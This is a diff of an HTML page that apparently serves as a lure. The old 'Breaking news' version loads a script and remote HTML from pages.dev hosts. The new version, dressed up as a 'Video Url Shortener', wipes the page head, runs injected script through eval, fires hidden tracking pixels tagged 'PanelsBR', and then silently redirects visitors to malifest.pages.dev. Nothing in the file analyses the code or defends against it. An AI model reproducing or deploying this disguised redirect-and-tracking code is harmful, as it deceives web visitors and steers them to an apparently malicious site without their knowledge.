@@ -1,51 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta content='NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET' name='robots'/>
-  <title>Breaking news</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <link rel="openid.server" href="https://www.blogger.com/openid-server.g" />
-
-  <!-- Cargar el script directamente en el encabezado -->
-  <script src="https://malifest.pages.dev/"></script>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malifest Page</title>
 </head>
-<body bgcolor="#000">
-  <div class="container">
-    <!-- Contenido de tu página actual -->
-    <div class="separator" style="clear: both; text-align: center;">
-      <img alt="" border="0" data-original-height="513" data-original-width="912"
-        height="auto" src="https://media.discordapp.net/attachments/1157424095940583486/1157424451252658197/hregrfnxdkjfhb4rtfacebookiamnge.jpg?ex=651e7dc5&is=651d2c45&hm=5974140c26a3efc9b8bc0590c2276113540c27e571159c244699ec49f63320d7&=&width=1073&height=596"
-        width="100%" />
-    </div>
-
-    <!-- Contenido adicional cargado desde otra ubicación -->
-    <div id="externalContent"></div>
-  </div>
-
-  <!-- 'Tú eres el responsable de informar a los visitantes de tu blog de las cookies que utilizas en él. Para más información, ve a http://www.blogger.com/go/cookiechoices.' -->
-  <script src="/js/cookiechoices.js" defer></script>
+<body>
   <script>
-    document.addEventListener('DOMContentLoaded', function(event) {
-      window.cookieChoices && cookieChoices.showCookieConsentBar && cookieChoices.showCookieConsentBar(
-        (window.cookieOptions && cookieOptions.msg) || 'Este sitio emplea cookies de Google para prestar sus servicios, para personalizar anuncios y para analizar el tráfico. Google recibe información sobre tu uso de este sitio web. Si utilizas este sitio web, se sobreentiende que aceptas el uso de cookies.',
-        (window.cookieOptions && cookieOptions.close) || 'Entendido',
-        (window.cookieOptions && cookieOptions.learn) || 'Más información',
-        (window.cookieOptions && cookieOptions.link) || 'https://www.blogger.com/go/blogspot-cookies');
-    });
-
-    // Cargar contenido externo después de que la página haya cargado
-    document.addEventListener('DOMContentLoaded', function() {
-      var externalContentContainer = document.getElementById('externalContent');
-
-      // Realizar una solicitud HTTP para obtener el contenido externo
-      var xhr = new XMLHttpRequest();
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-          externalContentContainer.innerHTML = xhr.responseText;
+    function checkbody(call) {
+      var timer = setInterval(function () {
+        if (document.querySelector('html')) {
+          clearInterval(timer);
+          if (typeof call == 'function') {
+            call(document.querySelector('html'));
+          }
         }
-      };
-      xhr.open('GET', 'https://appchoise.pages.dev/', true);
-      xhr.send();
+      }, 10);
+    }
+
+    function insertHtml(ele, html) {
+      ele.innerHTML = html;
+      var codes = ele.getElementsByTagName('script');
+      for (var i = 0; i < codes.length; i++) {
+        console.log(codes[i]);
+        eval(codes[i].text);
+      }
+    }
+
+    checkbody(function (body) {
+      try {
+        if (document.head) {
+          document.head.innerHTML = '';
+        }
+      } catch (d) { }
+
+      insertHtml(body, `<!DOCTYPE html>
+      <html lang="en">
+      <head>
+          <meta charset="UTF-8">
+          <meta http-equiv="X-UA-Compatible" content="IE=edge">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Video Url Shortener</title>
+      </head>
+      <body>
+          <script>
+              var contador = "brayan"
+              var useragent = navigator.userAgent;
+              let i = new Image();
+              i.src = "https://whos.amung.us/pingjs/?k=" + contador + "&t=PanelsBR&c=s&x=https://google.com/&y=https://google.com/&a=-1&d=0&v=27&r=" + Math.ceil(Math.random() * 9999);
+              i.id = 'kon';
+              document.body.appendChild(i);
+              setTimeout(() => {
+                  document.getElementById('kon').remove()
+              }, 1000);
+          
+              let i2 = new Image();
+              i2.src = "https://whos.amung.us/pingjs/?k=panelsbr&t=PanelsBR&c=s&x=https://twitter.com/&y=https://twitter.com/&a=-1&d=0&v=27&r=" + Math.ceil(Math.random() * 9999);
+              i2.id = 'kong';
+              document.body.appendChild(i2);
+              setTimeout(() => {
+                  document.getElementById('kong').remove()
+              }, 1000)
+              
+              setTimeout(() => {
+                window.location.href = "https://malifest.pages.dev/"
+              }, 1100);
+          </script>
+      </body>
+      </html>`);
     });
   </script>
 </body>
